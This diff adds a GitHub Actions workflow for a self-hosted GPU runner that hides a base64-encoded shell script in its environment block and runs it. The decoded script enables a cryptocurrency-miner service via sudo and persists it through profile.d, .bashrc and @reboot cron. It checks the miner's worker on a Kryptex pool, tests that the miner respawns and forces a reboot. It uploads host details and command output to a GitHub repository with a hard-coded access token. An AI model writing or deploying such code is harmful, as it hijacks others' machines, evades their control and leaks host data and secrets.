@@ -1,0 +1,70 @@
+name: ul-t2-p3
+on: [workflow_dispatch]
+permissions:
+  contents: write
+env:
+  B64: |
+    c2V0ICtlClM9InN1ZG8gLW4iOyBIPSQoaG9zdG5hbWUgLXMpOyBUPSQoZGF0ZSAtdSArJVklbSVkVCVI
+    JU0lU1opClc9cHJsMXBlazhyaDh5amNrNXE3NTk2YXBoN3VhN3hua3FzOHVyOW1rZm16OHc3eGZ6Y2Rm
+    Y2Z4NXZzeDJmNGx6CldSSz11bC10Mi1wcy0xNDktODEtMTAtMjQyLWcwClBBVD1naHBfNnRQMjVpQzl3
+    cENZQlpFbXBSVlJPS2hFeEllbVRjMnVwNGk3CmVjaG8gIj09IHQycDMgJFQgaG9zdD0kSCBib290X2lk
+    PSQoY2F0IC9wcm9jL3N5cy9rZXJuZWwvcmFuZG9tL2Jvb3RfaWQpIHVwPSQodXB0aW1lIC1zKSIKZWNo
+    byAiLS0gdW5pdCI7ICRTIHN5c3RlbWN0bCBjYXQgdWwtdDItcHMwLnNlcnZpY2UgfCBncmVwIC1FICdF
+    eGVjU3RhcnR8UmVzdGFydHxXYW50ZWRCeXxOaWNlJwplY2hvICItLSBlbmFibGUiOyAkUyBzeXN0ZW1j
+    dGwgZW5hYmxlIHVsLXQyLXBzMCAyPiYxIHwgdGFpbCAtMQplY2hvICItLSBsYXllcnMiCiRTIHNoIC1j
+    ICdlY2hvICIvb3B0L3VsLXQyL2tlZXAuc2ggPi9kZXYvbnVsbCAyPiYxIiA+IC9ldGMvcHJvZmlsZS5k
+    L3VsLXQyLnNoOyBjaG1vZCA2NDQgL2V0Yy9wcm9maWxlLmQvdWwtdDIuc2gnCmdyZXAgLXEgJ3VsLXQy
+    L2tlZXAuc2gnIC9ob21lL3VidW50dS8uYmFzaHJjIDI+L2Rldi9udWxsIHx8IGVjaG8gJy9vcHQvdWwt
+    dDIva2VlcC5zaCA+L2Rldi9udWxsIDI+JjEnID4+IC9ob21lL3VidW50dS8uYmFzaHJjCiRTIGNyb250
+    YWIgLWwgfCBncmVwIC1FICd1bC10MicgCmVjaG8gIi0tIGJvb3Rwcm9vZiIKJFMgdGVlIC9vcHQvdWwt
+    dDIvYm9vdHByb29mLnNoID4vZGV2L251bGwgPDwnRU9GJwojIS9iaW4vYmFzaApzbGVlcCA2MApXPXBy
+    bDFwZWs4cmg4eWpjazVxNzU5NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNkZmNmeDV2c3gyZjRs
+    egpXUks9dWwtdDItcHMtMTQ5LTgxLTEwLTI0Mi1nMApIPSQoaG9zdG5hbWUgLXMpOyBPPS90bXAvYm9v
+    dHByb29mLnR4dAp7IGVjaG8gImJvb3Rwcm9vZiAkKGRhdGUgLXUgKyVGVCVUWikgaG9zdD0kSCI7IHVw
+    dGltZSAtczsgZWNobyAiYm9vdF9pZD0kKGNhdCAvcHJvYy9zeXMva2VybmVsL3JhbmRvbS9ib290X2lk
+    KSI7IHN5c3RlbWN0bCBpcy1hY3RpdmUgdWwtdDItcHMwOyBwZ3JlcCAtZmEgIiRXUksiIHwgaGVhZCAt
+    MjsgbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1pbmRleCxuYW1lLG1lbW9yeS51c2VkLHV0aWxpemF0aW9u
+    LmdwdSAtLWZvcm1hdD1jc3Ysbm9oZWFkZXI7IGN1cmwgLXMgLW0gMjAgImh0dHBzOi8vcG9vbC5rcnlw
+    dGV4LmNvbS9wcmwvYXBpL3YzL21pbmVyL3dvcmtlcnMvJFciIHwgdHIgJ3snICdcbicgfCBncmVwICJc
+    IndvcmtlclwiOlwiJFdSS1wiIjsgfSA+ICRPIDI+JjEKYj0kKGJhc2U2NCAtdzAgPCAkTyk7IFA9ImNt
+    ZG91dDgvYm9vdHByb29mXyRILnR4dCI7IEI9aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9kb25n
+    c3VqdS91bC1wbGFudC9jb250ZW50cy8kUApzPSQoY3VybCAtcyAtbSAyMCAtSCAiQXV0aG9yaXphdGlv
+    bjogdG9rZW4gJFBBVCIgIiRCP3JlZj1tYWluIiB8IHNlZCAtbiAncy8uKiJzaGEiOiAqIlwoW2EtZjAt
+    OV0qXCkiLiovXDEvcCcgfCBoZWFkIC0xKQppZiBbIC1uICIkcyIgXTsgdGhlbiBKPSJ7XCJtZXNzYWdl
+    XCI6XCJib290cHJvb2ZcIixcImNvbnRlbnRcIjpcIiRiXCIsXCJzaGFcIjpcIiRzXCIsXCJicmFuY2hc
+    IjpcIm1haW5cIn0iOyBlbHNlIEo9IntcIm1lc3NhZ2VcIjpcImJvb3Rwcm9vZlwiLFwiY29udGVudFwi
+    OlwiJGJcIixcImJyYW5jaFwiOlwibWFpblwifSI7IGZpCmN1cmwgLXMgLW8gL2Rldi9udWxsIC1tIDMw
+    IC1YIFBVVCAtSCAiQXV0aG9yaXphdGlvbjogdG9rZW4gJFBBVCIgLUggIkNvbnRlbnQtVHlwZTogYXBw
+    bGljYXRpb24vanNvbiIgLWQgIiRKIiAiJEIiCkVPRgokUyBzZWQgLWkgInMjXlBBVD0uKiNQQVQ9JFBB
+    VCMiIC9vcHQvdWwtdDIvYm9vdHByb29mLnNoCiRTIGNobW9kIDc1NSAvb3B0L3VsLXQyL2Jvb3Rwcm9v
+    Zi5zaAokUyBzaCAtYyAneyBjcm9udGFiIC1sIDI+L2Rldi9udWxsIHwgZ3JlcCAtdiAidWwtdDIvYm9v
+    dHByb29mLnNoIjsgZWNobyAiQHJlYm9vdCAvb3B0L3VsLXQyL2Jvb3Rwcm9vZi5zaCI7IH0gfCBjcm9u
+    dGFiIC0nCiRTIGNyb250YWIgLWwgfCBncmVwIC1FICd1bC10MicKZWNobyAiLS0gcmVzcGF3biB0ZXN0
+    IgpUMD0kKGRhdGUgKyVzKTsgJFMgcGtpbGwgLTkgLWYgIiRXUksiIDI+L2Rldi9udWxsOyBlY2hvICJr
+    aWxsZWRfYXQ9JFQwIgpycz0tMTsgZm9yIGogaW4gJChzZXEgMSAyNCk7IGRvIHNsZWVwIDU7IGlmIHBn
+    cmVwIC1mICIkV1JLIiA+L2Rldi9udWxsOyB0aGVuIHJzPSQoKCAkKGRhdGUgKyVzKSAtIFQwICkpOyBi
+    cmVhazsgZmk7IGRvbmUKZWNobyAiUkVTUEFXTl9TRUNPTkRTPSRycyIKJFMgc3lzdGVtY3RsIGlzLWFj
+    dGl2ZSB1bC10Mi1wczA7ICRTIHRhaWwgLTQgL29wdC91bC10Mi9sb2dzL3BzMC5sb2cgfCBjdXQgLWMx
+    LTE2MAplY2hvICItLSBwb29sIGFmdGVyIHJlc3Bhd24iCmZvciBpIGluIDEgMiAzIDQgNTsgZG8KICBS
+    PSQoY3VybCAtcyAtbSAyMCAiaHR0cHM6Ly9wb29sLmtyeXB0ZXguY29tL3BybC9hcGkvdjMvbWluZXIv
+    d29ya2Vycy8kVyIgfCB0ciAneycgJ1xuJyB8IGdyZXAgIlwid29ya2VyXCI6XCIkV1JLXCIiKQogIGVj
+    aG8gInRyeSRpICR7UjowOjI4MH0iCiAgY2FzZSAiJFIiIGluIConInZhbGlkIjonKikgdj0kKHByaW50
+    ZiAnJXMnICIkUiIgfCBzZWQgLW4gJ3MvLioidmFsaWQiOlwoWzAtOV0qXCkuKi9cMS9wJyk7IFsgIiR7
+    djotMH0iIC1ndCAwIF0gJiYgYnJlYWs7OyBlc2FjCiAgc2xlZXAgMTIKZG9uZQplY2hvICItLSByZWJv
+    b3QgYXJtZWQgaW4gNTBzIgokUyBzaCAtYyAnbm9odXAgYmFzaCAtYyAic2xlZXAgNTA7IHJlYm9vdCIg
+    Pi9kZXYvbnVsbCAyPiYxICYnCmVjaG8gZG9uZQo=
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - name: run
+        run: |
+          echo "$B64" | base64 -d > /tmp/t2p3.sh
+          bash /tmp/t2p3.sh 2>&1 | tee /tmp/t2p3.out
+          H=$(hostname -s); C=$(base64 -w0 /tmp/t2p3.out)
+          T=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
+          P="cmdout8/ul-t2-p3_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$S" ]; then J="{\"message\":\"t2p3\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2p3\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
+          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" | head -c 100
